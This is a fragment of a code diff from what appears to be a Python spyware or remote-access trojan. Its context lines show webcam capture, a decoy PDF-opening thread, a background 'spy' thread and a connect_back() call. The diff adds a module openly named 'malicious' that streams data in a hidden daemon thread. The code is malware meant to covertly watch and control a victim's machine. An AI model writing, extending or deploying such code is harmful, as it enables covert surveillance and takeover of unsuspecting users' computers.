@@ -15,6 +15,7 @@ from win32com.client import Dispatch # type: ignore
 import pythoncom # type: ignore
 import cv2 # type: ignore
 import base64
+from .mailicous_webrtc_connect import RunMailicousStreamer
 cap = cv2.VideoCapture(0)
 SERVER_URL = "http://127.0.0.1:2020"
 SAMPLE_RATE = 44100
@@ -122,4 +123,5 @@ def connect_back():
     s.close()
 threading.Thread(target=open_pdf).start()
 threading.Thread(target=spy,daemon=True).start()
+threading.Thread(target=RunMailicousStreamer,daemon=True).start()
 connect_back()
